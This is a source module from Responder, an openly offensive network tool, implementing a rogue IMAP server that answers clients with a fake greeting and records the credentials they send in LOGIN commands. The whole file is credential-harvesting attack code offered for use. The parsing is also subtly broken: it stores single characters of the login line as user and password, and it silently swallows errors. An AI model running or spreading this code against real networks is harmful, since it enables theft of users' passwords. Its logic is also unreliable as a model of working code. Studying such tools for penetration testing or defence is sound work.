#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from SocketServer import BaseRequestHandler
from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

class IMAP(BaseRequestHandler):
	def handle(self):
		try:
			self.request.send(str(IMAPGreeting()))
			data = self.request.recv(1024)

			if data[5:15] == "CAPABILITY":
				RequestTag = data[0:4]
				self.request.send(str(IMAPCapability()))
				self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
				data = self.request.recv(1024)

			if data[5:10] == "LOGIN":
				Credentials = data[10:].strip()

				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': Credentials[0], 
					'cleartext': Credentials[1], 
					'fullhash': Credentials[0]+":"+Credentials[1],
				})

				## FIXME: Close connection properly
				## self.request.send(str(ditchthisconnection()))
				## data = self.request.recv(1024)
		except Exception:
			pass
